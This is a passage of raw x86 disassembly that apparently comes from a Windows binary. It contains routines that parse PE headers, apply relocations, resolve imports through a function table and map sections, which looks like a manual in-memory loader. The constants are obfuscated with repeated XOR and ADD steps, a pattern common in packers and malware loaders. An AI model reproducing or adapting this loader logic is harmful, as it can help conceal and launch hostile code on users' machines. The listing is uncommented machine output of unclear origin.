  425737:	and    DWORD PTR [ebp-0xc],0x0
  42573b:	and    edx,esi
  42573d:	add    edx,eax
  42573f:	movzx  edi,WORD PTR [edx+0xe]
  425743:	movzx  ebx,WORD PTR [edx+0xc]
  425747:	add    edi,ebx
  425749:	je     0x4257b4
  42574b:	lea    ecx,[edx+0x14]
  42574e:	mov    DWORD PTR [ebp-0x14],ecx
  425751:	test   DWORD PTR [ecx],esi
  425753:	je     0x425796
  425755:	mov    ecx,DWORD PTR [ecx]
  425757:	and    DWORD PTR [ebp-0x8],0x0
  42575b:	and    ecx,esi
  42575d:	add    ecx,eax
  42575f:	movzx  edi,WORD PTR [ecx+0xe]
  425763:	movzx  ebx,WORD PTR [ecx+0xc]
  425767:	add    edi,ebx
  425769:	je     0x425796
  42576b:	lea    edi,[ecx+0x14]
  42576e:	mov    DWORD PTR [ebp-0x4],edi
  425771:	mov    edi,DWORD PTR [ebp-0x4]
  425774:	mov    edi,DWORD PTR [edi]
  425776:	test   edi,edi
  425778:	je     0x425780
  42577a:	mov    ebx,DWORD PTR [ebp-0x1c]
  42577d:	add    DWORD PTR [edi+eax*1],ebx
  425780:	movzx  edi,WORD PTR [ecx+0xe]
  425784:	movzx  ebx,WORD PTR [ecx+0xc]
  425788:	inc    DWORD PTR [ebp-0x8]
  42578b:	add    DWORD PTR [ebp-0x4],0x8
  42578f:	add    edi,ebx
  425791:	cmp    DWORD PTR [ebp-0x8],edi
  425794:	jb     0x425771
  425796:	movzx  edi,WORD PTR [edx+0xe]
  42579a:	movzx  ebx,WORD PTR [edx+0xc]
  42579e:	mov    ecx,DWORD PTR [ebp-0x14]
  4257a1:	inc    DWORD PTR [ebp-0xc]
  4257a4:	add    ecx,0x8
  4257a7:	add    edi,ebx
  4257a9:	mov    DWORD PTR [ebp-0x14],ecx
  4257ac:	cmp    DWORD PTR [ebp-0xc],edi
  4257af:	jb     0x425751
  4257b1:	mov    ecx,DWORD PTR [ebp-0x18]
  4257b4:	movzx  edx,WORD PTR [eax+0xe]
  4257b8:	movzx  edi,WORD PTR [eax+0xc]
  4257bc:	inc    DWORD PTR [ebp-0x10]
  4257bf:	add    ecx,0x8
  4257c2:	add    edx,edi
  4257c4:	mov    DWORD PTR [ebp-0x18],ecx
  4257c7:	cmp    DWORD PTR [ebp-0x10],edx
  4257ca:	jb     0x425731
  4257d0:	pop    edi
  4257d1:	pop    ebx
  4257d2:	xor    eax,eax
  4257d4:	inc    eax
  4257d5:	jmp    0x4257d9
  4257d7:	xor    eax,eax
  4257d9:	pop    esi
  4257da:	leave  
  4257db:	ret    
  4257dc:	push   ebp
  4257dd:	mov    ebp,esp
  4257df:	mov    ecx,DWORD PTR [ecx+0x190]
  4257e5:	mov    eax,DWORD PTR [ebp+0xc]
  4257e8:	sub    esp,0x10
  4257eb:	push   ebx
  4257ec:	xor    ebx,ebx
  4257ee:	push   esi
  4257ef:	push   edi
  4257f0:	cmp    DWORD PTR [ecx],ebx
  4257f2:	je     0x42587a
  4257f8:	cmp    eax,ebx
  4257fa:	je     0x42587a
  4257fc:	cmp    DWORD PTR [eax+0x78],ebx
  4257ff:	jne    0x425806
  425801:	xor    eax,eax
  425803:	inc    eax
  425804:	jmp    0x42587c
  425806:	mov    eax,DWORD PTR [eax+0x78]
  425809:	add    eax,DWORD PTR [ebp+0x8]
  42580c:	mov    ecx,DWORD PTR [eax+0x1c]
  42580f:	mov    edx,DWORD PTR [eax+0x24]
  425812:	mov    esi,DWORD PTR [eax+0x14]
  425815:	mov    edi,DWORD PTR [eax+0x18]
  425818:	add    ecx,DWORD PTR [ebp+0x8]
  42581b:	add    edx,DWORD PTR [ebp+0x8]
  42581e:	mov    DWORD PTR [ebp-0x4],esi
  425821:	cmp    esi,edi
  425823:	ja     0x425828
  425825:	mov    DWORD PTR [ebp-0x4],edi
  425828:	mov    DWORD PTR [ebp-0x8],ebx
  42582b:	cmp    DWORD PTR [ebp-0x4],ebx
  42582e:	jbe    0x425801
  425830:	cmp    ebx,DWORD PTR [eax+0x14]
  425833:	jae    0x42583b
  425835:	movzx  esi,WORD PTR [edx+ebx*2]
  425839:	jmp    0x42583d
  42583b:	mov    esi,ebx
  42583d:	lea    esi,[ecx+esi*4]
  425840:	mov    edi,DWORD PTR [esi]
  425842:	test   edi,edi
  425844:	je     0x42586f
  425846:	add    edi,DWORD PTR [ebp+0x8]
  425849:	mov    DWORD PTR [ebp-0x10],edi
  42584c:	cmp    edi,eax
  42584e:	jbe    0x425860
  425850:	mov    ebx,DWORD PTR [ebp+0xc]
  425853:	mov    ebx,DWORD PTR [ebx+0x7c]
  425856:	add    ebx,eax
  425858:	cmp    edi,ebx
  42585a:	jae    0x425860
  42585c:	mov    esi,DWORD PTR [esi]
  42585e:	jmp    0x425868
  425860:	sub    edi,DWORD PTR [ebp+0x8]
  425863:	mov    DWORD PTR [esi],edi
  425865:	mov    esi,DWORD PTR [ebp-0x10]
  425868:	test   esi,esi
  42586a:	je     0x42587a
  42586c:	mov    ebx,DWORD PTR [ebp-0x8]
  42586f:	inc    ebx
  425870:	mov    DWORD PTR [ebp-0x8],ebx
  425873:	cmp    ebx,DWORD PTR [ebp-0x4]
  425876:	jb     0x425830
  425878:	jmp    0x425801
  42587a:	xor    eax,eax
  42587c:	pop    edi
  42587d:	pop    esi
  42587e:	pop    ebx
  42587f:	leave  
  425880:	ret    0x8
  425883:	push   ebp
  425884:	mov    ebp,esp
  425886:	sub    esp,0x2c
  425889:	mov    edx,0xf89c85b0
  42588e:	mov    DWORD PTR [ebp-0x4],edx
  425891:	mov    DWORD PTR [ebp-0x8],0xf89c85b1
  425898:	mov    eax,DWORD PTR [ebp-0x4]
  42589b:	mov    ecx,DWORD PTR [ebp-0x4]
  42589e:	mov    ecx,DWORD PTR [ebp-0x4]
  4258a1:	mov    ecx,DWORD PTR [ebp-0x4]
  4258a4:	mov    ecx,DWORD PTR [ebp-0x4]
  4258a7:	mov    ecx,DWORD PTR [ebp-0x4]
  4258aa:	push   ebx
  4258ab:	mov    ebx,DWORD PTR [ebp+0x10]
  4258ae:	push   esi
  4258af:	mov    esi,0x75108a4
  4258b4:	mov    DWORD PTR [ebp-0x10],0x352eb2e
  4258bb:	mov    ecx,DWORD PTR [ebp-0x4]
  4258be:	mov    ebx,DWORD PTR [ebx+0x190]
  4258c4:	push   edi
  4258c5:	mov    edi,0x3272ec
  4258ca:	xor    ecx,esi
  4258cc:	xor    eax,esi
  4258ce:	add    eax,edi
  4258d0:	add    ecx,edi
  4258d2:	mov    DWORD PTR [ebp-0x18],eax
  4258d5:	cmp    ecx,DWORD PTR [ebx]
  4258d7:	je     0x425b58
  4258dd:	mov    ebx,DWORD PTR [ebp-0x4]
  4258e0:	mov    ecx,DWORD PTR [ebp+0xc]
  4258e3:	xor    ebx,esi
  4258e5:	add    ebx,edi
  4258e7:	cmp    ebx,ecx
  4258e9:	je     0x425b58
  4258ef:	mov    ebx,DWORD PTR [ebp-0x4]
  4258f2:	mov    ecx,DWORD PTR [ecx+0x80]
  4258f8:	xor    ebx,esi
  4258fa:	add    ebx,edi
  4258fc:	cmp    ecx,ebx
  4258fe:	je     0x425b53
  425904:	add    ecx,DWORD PTR [ebp+0x8]
  425907:	mov    DWORD PTR [ebp-0x2c],ecx
  42590a:	mov    ebx,edx
  42590c:	xor    ebx,esi
  42590e:	add    ebx,edi
  425910:	mov    DWORD PTR [ebp-0x10],ebx
  425913:	mov    ebx,DWORD PTR [ebp-0x10]
  425916:	cmp    ebx,edx
  425918:	je     0x42592c
  42591a:	mov    edx,DWORD PTR [ebp-0x10]
  42591d:	mov    ebx,DWORD PTR [ebp-0x4]
  425920:	imul   edx,edx,0x14
  425923:	xor    ebx,esi
  425925:	add    ebx,edi
  425927:	cmp    DWORD PTR [edx+ecx*1],ebx
  42592a:	jne    0x425943
  42592c:	mov    edx,DWORD PTR [ebp-0x10]
  42592f:	mov    ebx,DWORD PTR [ebp-0x4]
  425932:	imul   edx,edx,0x14
  425935:	xor    ebx,esi
  425937:	add    ebx,edi
  425939:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  42593d:	je     0x425b45
  425943:	mov    eax,DWORD PTR [ebp-0x4]
  425946:	mov    ebx,DWORD PTR [ebp-0x4]
  425949:	mov    eax,DWORD PTR [ebp-0x10]
  42594c:	imul   eax,eax,0x14
  42594f:	add    eax,ecx
  425951:	mov    ecx,DWORD PTR [eax+0x10]
  425954:	add    ecx,DWORD PTR [ebp+0x8]
  425957:	xor    ebx,esi
  425959:	mov    DWORD PTR [ebp-0x1c],ecx
  42595c:	mov    ecx,DWORD PTR [ebp-0x4]
  42595f:	mov    edx,DWORD PTR [ebp-0x4]
  425962:	xor    ecx,esi
  425964:	add    ecx,edi
  425966:	xor    edx,esi
  425968:	mov    DWORD PTR [ebp-0x24],ecx
  42596b:	mov    ecx,DWORD PTR [eax]
  42596d:	add    edx,edi
  42596f:	add    ebx,edi
  425971:	cmp    ecx,edx
  425973:	je     0x42597b
  425975:	add    ecx,DWORD PTR [ebp+0x8]
  425978:	mov    DWORD PTR [ebp-0x24],ecx
  42597b:	mov    ecx,DWORD PTR [ebp-0x4]
  42597e:	xor    ecx,esi
  425980:	add    ecx,DWORD PTR [eax+0xc]
  425983:	mov    eax,DWORD PTR [ebp+0x8]
  425986:	lea    eax,[ecx+eax*1+0x3272ec]
  42598d:	mov    DWORD PTR [ebp+0xc],eax
  425990:	mov    DWORD PTR [ebp-0x28],0xf89c85bd
  425997:	mov    eax,DWORD PTR [ebp+0x10]
  42599a:	push   DWORD PTR [ebp+0xc]
  42599d:	mov    eax,DWORD PTR [eax+0x1d8]
  4259a3:	call   DWORD PTR [eax]
  4259a5:	mov    ecx,DWORD PTR [ebp-0x4]
  4259a8:	xor    ecx,esi
  4259aa:	add    ecx,edi
  4259ac:	mov    DWORD PTR [ebp-0xc],eax
  4259af:	cmp    ecx,eax
  4259b1:	jne    0x4259c5
  4259b3:	mov    eax,DWORD PTR [ebp+0x10]
  4259b6:	push   DWORD PTR [ebp+0xc]
  4259b9:	mov    eax,DWORD PTR [eax+0x1d8]
  4259bf:	call   DWORD PTR [eax+0xc]
  4259c2:	mov    DWORD PTR [ebp-0xc],eax
  4259c5:	mov    DWORD PTR [ebp-0x20],0x7f661b29
  4259cc:	mov    DWORD PTR [ebp-0x20],0xf89c9859
  4259d3:	mov    eax,DWORD PTR [ebp-0x4]
  4259d6:	xor    eax,esi
  4259d8:	add    eax,edi
  4259da:	cmp    eax,DWORD PTR [ebp-0xc]
  4259dd:	jne    0x425a02
  4259df:	mov    eax,DWORD PTR [ebp-0x8]
  4259e2:	mov    ecx,DWORD PTR [ebp-0x20]
  4259e5:	xor    eax,esi
  4259e7:	xor    ecx,esi
  4259e9:	lea    ebx,[ebx+eax*1+0x3272ec]
  4259f0:	mov    eax,DWORD PTR [ebp+0x10]
  4259f3:	mov    eax,DWORD PTR [eax+0x1d8]
  4259f9:	add    ecx,edi
  4259fb:	imul   ecx,ebx
  4259fe:	push   ecx
  4259ff:	call   DWORD PTR [eax+0x24]
  425a02:	mov    eax,DWORD PTR [ebp-0x4]
  425a05:	xor    eax,esi
  425a07:	add    eax,edi
  425a09:	cmp    eax,DWORD PTR [ebp-0xc]
  425a0c:	jne    0x425a1d
  425a0e:	mov    eax,DWORD PTR [ebp-0x28]
  425a11:	xor    eax,esi
  425a13:	add    eax,edi
  425a15:	cmp    ebx,eax
  425a17:	jbe    0x425997
  425a1d:	mov    eax,DWORD PTR [ebp-0x4]
  425a20:	xor    eax,esi
  425a22:	add    eax,edi
  425a24:	cmp    eax,DWORD PTR [ebp-0xc]
  425a27:	jne    0x425a40
  425a29:	mov    eax,DWORD PTR [ebp-0x8]
  425a2c:	mov    ecx,DWORD PTR [ebp-0x18]
  425a2f:	xor    eax,esi
  425a31:	lea    eax,[ecx+eax*1+0x3272ec]
  425a38:	mov    DWORD PTR [ebp-0x18],eax
  425a3b:	jmp    0x425b2f
  425a40:	mov    DWORD PTR [ebp-0x14],0x1121b28
  425a47:	mov    DWORD PTR [ebp+0xc],0xe042d2e
  425a4e:	mov    ebx,DWORD PTR [ebp-0x4]
  425a51:	xor    ebx,esi
  425a53:	add    ebx,edi
  425a55:	jmp    0x425b1c
  425a5a:	mov    eax,DWORD PTR [ebp-0x4]
  425a5d:	xor    eax,esi
  425a5f:	add    eax,edi
  425a61:	mov    DWORD PTR [ebp-0x14],eax
  425a64:	mov    eax,DWORD PTR [ebp-0x4]
  425a67:	xor    eax,esi
  425a69:	add    eax,edi
  425a6b:	mov    DWORD PTR [ebp+0xc],eax
  425a6e:	mov    ecx,DWORD PTR [ebp-0x4]
  425a71:	mov    eax,DWORD PTR [ebp-0x24]
  425a74:	xor    ecx,esi
  425a76:	add    ecx,edi
  425a78:	cmp    ecx,eax
  425a7a:	je     0x425a82
  425a7c:	mov    eax,DWORD PTR [eax+ebx*4]
  425a7f:	mov    DWORD PTR [ebp-0x14],eax
  425a82:	mov    eax,DWORD PTR [ebp-0x1c]
  425a85:	mov    eax,DWORD PTR [eax+ebx*4]
  425a88:	mov    DWORD PTR [ebp+0xc],eax
  425a8b:	mov    eax,DWORD PTR [ebp-0x4]
  425a8e:	mov    ecx,DWORD PTR [ebp-0x14]
  425a91:	xor    eax,esi
  425a93:	add    eax,edi
  425a95:	cmp    eax,ecx
  425a97:	je     0x425ac2
  425a99:	mov    eax,DWORD PTR [ebp-0x4]
  425a9c:	mov    ecx,DWORD PTR [ebp-0x14]
  425a9f:	xor    eax,esi
  425aa1:	add    eax,edi
  425aa3:	shr    ecx,0x1f
  425aa6:	cmp    eax,ecx
  425aa8:	je     0x425ac2
  425aaa:	mov    ecx,DWORD PTR [ebp-0x14]
  425aad:	mov    eax,DWORD PTR [ebp+0x10]
  425ab0:	mov    eax,DWORD PTR [eax+0x1d8]
  425ab6:	movzx  ecx,cx
  425ab9:	push   ecx
  425aba:	push   DWORD PTR [ebp-0xc]
  425abd:	call   DWORD PTR [eax+0x8]
  425ac0:	jmp    0x425adb
  425ac2:	mov    eax,DWORD PTR [ebp+0xc]
  425ac5:	add    eax,DWORD PTR [ebp+0x8]
  425ac8:	mov    ecx,DWORD PTR [ebp+0x10]
  425acb:	mov    ecx,DWORD PTR [ecx+0x1d8]
  425ad1:	add    eax,0x2
  425ad4:	push   eax
  425ad5:	push   DWORD PTR [ebp-0xc]
  425ad8:	call   DWORD PTR [ecx+0x8]
  425adb:	mov    DWORD PTR [ebp+0xc],eax
  425ade:	mov    eax,DWORD PTR [ebp-0x4]
  425ae1:	mov    ecx,DWORD PTR [ebp+0xc]
  425ae4:	xor    eax,esi
  425ae6:	add    eax,edi
  425ae8:	cmp    eax,ecx
  425aea:	mov    eax,DWORD PTR [ebp-0x8]
  425aed:	jne    0x425b00
  425aef:	mov    ecx,DWORD PTR [ebp-0x18]
  425af2:	xor    eax,esi
  425af4:	lea    eax,[ecx+eax*1+0x3272ec]
  425afb:	mov    DWORD PTR [ebp-0x18],eax
  425afe:	jmp    0x425b10
  425b00:	mov    ecx,DWORD PTR [ebp+0xc]
  425b03:	xor    eax,esi
  425b05:	add    eax,edi
  425b07:	imul   eax,ecx
  425b0a:	mov    ecx,DWORD PTR [ebp-0x1c]
  425b0d:	mov    DWORD PTR [ecx+ebx*4],eax
  425b10:	mov    eax,DWORD PTR [ebp-0x8]
  425b13:	xor    eax,esi
  425b15:	lea    ebx,[ebx+eax*1+0x3272ec]
  425b1c:	mov    eax,DWORD PTR [ebp-0x4]
  425b1f:	mov    ecx,DWORD PTR [ebp-0x1c]
  425b22:	xor    eax,esi
  425b24:	add    eax,edi
  425b26:	cmp    DWORD PTR [ecx+ebx*4],eax
  425b29:	jne    0x425a5a
  425b2f:	mov    edx,DWORD PTR [ebp-0x10]
  425b32:	mov    ecx,DWORD PTR [ebp-0x2c]
  425b35:	mov    eax,DWORD PTR [ebp-0x18]
  425b38:	sub    edx,0x3272eb
  425b3e:	xor    edx,esi
  425b40:	jmp    0x42590a
  425b45:	mov    ecx,DWORD PTR [ebp-0x4]
  425b48:	xor    ecx,esi
  425b4a:	add    ecx,edi
  425b4c:	cmp    eax,ecx
  425b4e:	mov    eax,DWORD PTR [ebp-0x4]
  425b51:	jne    0x425b5b
  425b53:	mov    eax,DWORD PTR [ebp-0x8]
  425b56:	jmp    0x425b5b
  425b58:	mov    eax,DWORD PTR [ebp-0x4]
  425b5b:	xor    eax,esi
  425b5d:	add    eax,edi
  425b5f:	pop    edi
  425b60:	pop    esi
  425b61:	pop    ebx
  425b62:	leave  
  425b63:	ret    0xc
  425b66:	push   ebp
  425b67:	mov    ebp,esp
  425b69:	sub    esp,0x28
  425b6c:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  425b73:	mov    DWORD PTR [ebp-0x28],0xf89c85b1
  425b7a:	mov    eax,DWORD PTR [ebp+0xc]
  425b7d:	mov    DWORD PTR [ebp+0xc],eax
  425b80:	push   esi
  425b81:	mov    eax,eax
  425b83:	mov    eax,DWORD PTR [ebp-0x4]
  425b86:	mov    esi,DWORD PTR [ebp+0x8]
  425b89:	mov    ecx,0x75108a4
  425b8e:	xor    eax,ecx
  425b90:	mov    edx,0x3272ec
  425b95:	add    eax,edx
  425b97:	cmp    esi,eax
  425b99:	je     0x425cc0
  425b9f:	mov    eax,DWORD PTR [ebp+0x8]
  425ba2:	mov    esi,DWORD PTR [ebp+0x8]
  425ba5:	add    esi,DWORD PTR [eax+0x3c]
  425ba8:	push   edi
  425ba9:	mov    DWORD PTR [ebp+0xc],esi
  425bac:	mov    DWORD PTR [ebp-0x1c],0xf89c85bd
  425bb3:	mov    eax,DWORD PTR [ebp-0x1c]
  425bb6:	mov    esi,DWORD PTR [ebp-0x4]
  425bb9:	mov    edi,DWORD PTR [ebp+0xc]
  425bbc:	xor    esi,ecx
  425bbe:	xor    eax,ecx
  425bc0:	add    esi,edx
  425bc2:	cmp    DWORD PTR [edi+eax*8+0x19397d8],esi
  425bc9:	je     0x425cba
  425bcf:	mov    esi,DWORD PTR [ebp+0xc]
  425bd2:	mov    eax,DWORD PTR [ebp+0x8]
  425bd5:	add    eax,DWORD PTR [esi+0xa0]
  425bdb:	mov    esi,DWORD PTR [ebp+0x8]
  425bde:	mov    edi,DWORD PTR [ebp+0xc]
  425be1:	sub    esi,DWORD PTR [edi+0x34]
  425be4:	mov    edi,DWORD PTR [ebp-0x4]
  425be7:	xor    edi,ecx
  425be9:	add    edi,edx
  425beb:	mov    DWORD PTR [ebp-0x24],esi
  425bee:	cmp    esi,edi
  425bf0:	je     0x425cba
  425bf6:	mov    esi,DWORD PTR [ebp-0x4]
  425bf9:	xor    esi,ecx
  425bfb:	add    esi,edx
  425bfd:	mov    DWORD PTR [ebp-0x8],esi
  425c00:	push   ebx
  425c01:	mov    DWORD PTR [ebp-0x10],0xf89c85b3
  425c08:	jmp    0x425ca4
  425c0d:	mov    esi,DWORD PTR [ebp-0x4]
  425c10:	xor    esi,ecx
  425c12:	lea    edi,[ebx-0x8]
  425c15:	add    esi,edx
  425c17:	shr    edi,1
  425c19:	cmp    esi,edi
  425c1b:	jae    0x425c8a
  425c1d:	sub    edi,esi
  425c1f:	lea    ebx,[eax+esi*2+0x8]
  425c23:	mov    DWORD PTR [ebp-0x18],edi
  425c26:	movzx  esi,WORD PTR [ebx]
  425c29:	and    esi,0xfff
  425c2f:	mov    DWORD PTR [ebp-0x14],esi
  425c32:	mov    edi,DWORD PTR [ebp-0x14]
  425c35:	mov    esi,DWORD PTR [eax]
  425c37:	sub    esi,edx
  425c39:	add    edi,esi
  425c3b:	movzx  esi,WORD PTR [ebx]
  425c3e:	shr    esi,0xc
  425c41:	xor    edi,ecx
  425c43:	mov    DWORD PTR [ebp-0x20],edi
  425c46:	mov    DWORD PTR [ebp-0x14],esi
  425c49:	mov    esi,DWORD PTR [ebp-0x20]
  425c4c:	mov    edi,DWORD PTR [ebp+0x8]
  425c4f:	xor    esi,ecx
  425c51:	lea    esi,[esi+edi*1+0x3272ec]
  425c58:	mov    DWORD PTR [ebp-0x20],esi
  425c5b:	mov    esi,DWORD PTR [ebp-0x10]
  425c5e:	mov    edi,DWORD PTR [ebp-0x14]
  425c61:	xor    esi,ecx
  425c63:	add    esi,edx
  425c65:	cmp    edi,esi
  425c67:	jne    0x425c7f
  425c69:	mov    esi,DWORD PTR [ebp-0x10]
  425c6c:	mov    edi,DWORD PTR [ebp-0x14]
  425c6f:	xor    esi,ecx
  425c71:	add    esi,edx
  425c73:	cmp    edi,esi
  425c75:	jne    0x425c7f
  425c77:	mov    esi,DWORD PTR [ebp-0x20]
  425c7a:	mov    edi,DWORD PTR [ebp-0x24]
  425c7d:	add    DWORD PTR [esi],edi
  425c7f:	add    ebx,0x2
  425c82:	dec    DWORD PTR [ebp-0x18]
  425c85:	jne    0x425c26
  425c87:	mov    ebx,DWORD PTR [ebp-0xc]
  425c8a:	add    DWORD PTR [ebp-0x8],ebx
  425c8d:	mov    esi,DWORD PTR [ebp-0x1c]
  425c90:	mov    edi,DWORD PTR [ebp-0x8]
  425c93:	mov    ebx,DWORD PTR [ebp+0xc]
  425c96:	xor    esi,ecx
  425c98:	cmp    edi,DWORD PTR [ebx+esi*8+0x19397dc]
  425c9f:	jae    0x425cb9
  425ca1:	add    eax,DWORD PTR [ebp-0xc]
  425ca4:	mov    esi,DWORD PTR [ebp-0x4]
  425ca7:	mov    ebx,DWORD PTR [eax+0x4]
  425caa:	xor    esi,ecx
  425cac:	add    esi,edx
  425cae:	mov    DWORD PTR [ebp-0xc],ebx
  425cb1:	cmp    ebx,esi
  425cb3:	jne    0x425c0d
  425cb9:	pop    ebx
  425cba:	mov    eax,DWORD PTR [ebp-0x28]
  425cbd:	pop    edi
  425cbe:	jmp    0x425cc3
  425cc0:	mov    eax,DWORD PTR [ebp-0x4]
  425cc3:	xor    eax,ecx
  425cc5:	add    eax,edx
  425cc7:	pop    esi
  425cc8:	leave  
  425cc9:	ret    0x8
  425ccc:	push   ebp
  425ccd:	mov    ebp,esp
  425ccf:	sub    esp,0xd8
  425cd5:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  425cdc:	mov    DWORD PTR [ebp-0x24],0xf89c85b1
  425ce3:	mov    eax,DWORD PTR [ebp-0x4]
  425ce6:	push   ebx
  425ce7:	push   esi
  425ce8:	mov    esi,0x75108a4
  425ced:	xor    eax,esi
  425cef:	push   edi
  425cf0:	mov    edi,0x3272ec
  425cf5:	add    eax,edi
  425cf7:	mov    DWORD PTR [ebp-0x18],eax
  425cfa:	mov    eax,DWORD PTR [ebp-0x4]
  425cfd:	xor    eax,esi
  425cff:	add    eax,edi
  425d01:	mov    DWORD PTR [ebp-0x8],eax
  425d04:	mov    ebx,DWORD PTR [ebp+0x20]
  425d07:	mov    eax,DWORD PTR [ebp-0x1c]
  425d0a:	mov    ecx,DWORD PTR [ebp-0x1c]
  425d0d:	xor    eax,ecx
  425d0f:	mov    DWORD PTR [ebp-0x1c],eax
  425d12:	add    DWORD PTR [ebp-0x1c],0xf89cb5b0
  425d19:	mov    eax,DWORD PTR [ebp-0xc]
  425d1c:	mov    ecx,DWORD PTR [ebp-0xc]
  425d1f:	xor    eax,ecx
  425d21:	mov    DWORD PTR [ebp-0xc],eax
  425d24:	add    DWORD PTR [ebp-0xc],0xf89c85f0
  425d2b:	mov    eax,DWORD PTR [ebp-0x10]
  425d2e:	mov    ecx,DWORD PTR [ebp-0x10]
  425d31:	xor    eax,ecx
  425d33:	mov    DWORD PTR [ebp-0x10],eax
  425d36:	add    DWORD PTR [ebp-0x10],0xf89c85bc
  425d3d:	mov    eax,DWORD PTR [ebp-0x28]
  425d40:	mov    ecx,DWORD PTR [ebp-0x28]
  425d43:	xor    eax,ecx
  425d45:	mov    DWORD PTR [ebp-0x28],eax
  425d48:	add    DWORD PTR [ebp-0x28],0xf89f05b0
  425d4f:	mov    DWORD PTR [ebp+0x20],0xf89cefc5
  425d56:	mov    eax,DWORD PTR [ebp+0x8]
  425d59:	test   eax,eax
  425d5b:	je     0x4261e6
  425d61:	mov    eax,DWORD PTR [ebp+0xc]
  425d64:	test   eax,eax
  425d66:	je     0x4261e6
  425d6c:	mov    eax,DWORD PTR [ebp+0x18]
  425d6f:	test   eax,eax
  425d71:	je     0x4261e6
  425d77:	mov    eax,DWORD PTR [ebp+0x20]
  425d7a:	mov    ecx,DWORD PTR [ebp+0x8]
  425d7d:	xor    eax,0x8a4
  425d82:	add    eax,0x72ec
  425d87:	cmp    WORD PTR [ecx],ax
  425d8a:	jne    0x4261e6
  425d90:	mov    eax,DWORD PTR [ebp-0x4]
  425d93:	xor    eax,esi
  425d95:	add    eax,edi
  425d97:	mov    DWORD PTR [ebp-0x30],eax
  425d9a:	mov    eax,DWORD PTR [ebp-0x4]
  425d9d:	mov    ecx,DWORD PTR [ebp+0x8]
  425da0:	mov    eax,DWORD PTR [ebp+0x8]
  425da3:	add    eax,DWORD PTR [ecx+0x3c]
  425da6:	mov    DWORD PTR [ebp+0xc],eax
  425da9:	mov    eax,DWORD PTR [eax+0x50]
  425dac:	test   eax,eax
  425dae:	je     0x4261e6
  425db4:	mov    DWORD PTR [ebp-0x2c],0xf88c85b0
  425dbb:	mov    eax,DWORD PTR [ebp-0x2c]
  425dbe:	xor    eax,esi
  425dc0:	add    eax,edi
  425dc2:	mov    DWORD PTR [ebp-0x2c],eax
  425dc5:	mov    eax,DWORD PTR [ebp-0x4]
  425dc8:	mov    eax,DWORD PTR [ebx+0x190]
  425dce:	mov    ecx,DWORD PTR [eax]
  425dd0:	mov    ecx,DWORD PTR [ecx+0x3c]
  425dd3:	add    ecx,DWORD PTR [eax]
  425dd5:	mov    eax,DWORD PTR [ebp-0x4]
  425dd8:	mov    eax,DWORD PTR [ebx+0x18c]
  425dde:	mov    edx,DWORD PTR [eax]
  425de0:	mov    DWORD PTR [ebp-0x20],ecx
  425de3:	mov    DWORD PTR [ebp+0x20],edx
  425de6:	cmp    edx,edx
  425de8:	jne    0x425e1c
  425dea:	mov    eax,DWORD PTR [ebx+0x1d8]
  425df0:	lea    edx,[ebp-0x18]
  425df3:	push   edx
  425df4:	mov    edx,DWORD PTR [ebp-0xc]
  425df7:	xor    edx,esi
  425df9:	add    edx,edi
  425dfb:	push   edx
  425dfc:	push   DWORD PTR [ecx+0x50]
  425dff:	push   DWORD PTR [ebp+0x20]
  425e02:	call   DWORD PTR [eax+0x1c]
  425e05:	mov    eax,DWORD PTR [ebp-0x20]
  425e08:	mov    ecx,DWORD PTR [eax+0x54]
  425e0b:	mov    eax,DWORD PTR [eax+0x50]
  425e0e:	sub    eax,ecx
  425e10:	add    ecx,DWORD PTR [ebp+0x20]
  425e13:	push   ecx
  425e14:	call   0x426783
  425e19:	mov    edx,DWORD PTR [ebp+0x20]
  425e1c:	mov    eax,DWORD PTR [ebx+0x194]
  425e22:	mov    DWORD PTR [eax],edx
  425e24:	mov    eax,DWORD PTR [ebp+0xc]
  425e27:	push   DWORD PTR [eax+0x54]
  425e2a:	push   DWORD PTR [ebp+0x8]
  425e2d:	push   edx
  425e2e:	call   0x426679
  425e33:	mov    ecx,DWORD PTR [ebp+0x20]
  425e36:	mov    eax,DWORD PTR [ecx+0x3c]
  425e39:	add    eax,ecx
  425e3b:	movzx  ecx,WORD PTR [eax+0x14]
  425e3f:	lea    ecx,[ecx+eax*1+0x18]
  425e43:	mov    DWORD PTR [ebp+0x18],ecx
  425e46:	mov    ecx,DWORD PTR [ebp-0x4]
  425e49:	movzx  edx,WORD PTR [eax+0x6]
  425e4d:	xor    ecx,esi
  425e4f:	add    ecx,edi
  425e51:	mov    DWORD PTR [ebp+0xc],eax
  425e54:	cmp    edx,ecx
  425e56:	je     0x425f03
  425e5c:	mov    ecx,DWORD PTR [ebp-0x4]
  425e5f:	xor    ecx,esi
  425e61:	add    ecx,edi
  425e63:	mov    DWORD PTR [ebp-0x8],ecx
  425e66:	mov    ecx,DWORD PTR [ebp-0x24]
  425e69:	movzx  edx,WORD PTR [eax+0x6]
  425e6d:	xor    ecx,esi
  425e6f:	sub    edx,ecx
  425e71:	sub    edx,edi
  425e73:	cmp    DWORD PTR [ebp-0x8],edx
  425e76:	ja     0x425f03
  425e7c:	mov    edx,DWORD PTR [ebp+0x18]
  425e7f:	add    edx,0x8
  425e82:	mov    DWORD PTR [ebp+0x18],edx
  425e85:	jmp    0x425e8a
  425e87:	mov    edx,DWORD PTR [ebp+0x18]
  425e8a:	mov    eax,DWORD PTR [eax+0x38]
  425e8d:	lea    ecx,[eax-0x1]
  425e90:	mov    DWORD PTR [ebp-0x38],eax
  425e93:	mov    eax,DWORD PTR [edx]
  425e95:	test   eax,ecx
  425e97:	je     0x425ea0
  425e99:	not    ecx
  425e9b:	and    eax,ecx
  425e9d:	add    eax,DWORD PTR [ebp-0x38]
  425ea0:	mov    ecx,DWORD PTR [edx+0x4]
  425ea3:	add    ecx,DWORD PTR [ebp+0x20]
  425ea6:	push   ecx
  425ea7:	call   0x426783
  425eac:	mov    edx,DWORD PTR [ebp-0x4]
  425eaf:	mov    eax,DWORD PTR [ebp+0x18]
  425eb2:	mov    ecx,DWORD PTR [eax+0x8]
  425eb5:	xor    edx,esi
  425eb7:	add    edx,edi
  425eb9:	cmp    ecx,edx
  425ebb:	je     0x425ed4
  425ebd:	push   ecx
  425ebe:	mov    ecx,DWORD PTR [ebp+0x8]
  425ec1:	add    ecx,DWORD PTR [eax+0xc]
  425ec4:	mov    eax,DWORD PTR [eax+0x4]
  425ec7:	add    eax,DWORD PTR [ebp+0x20]
  425eca:	push   ecx
  425ecb:	push   eax
  425ecc:	call   0x426679
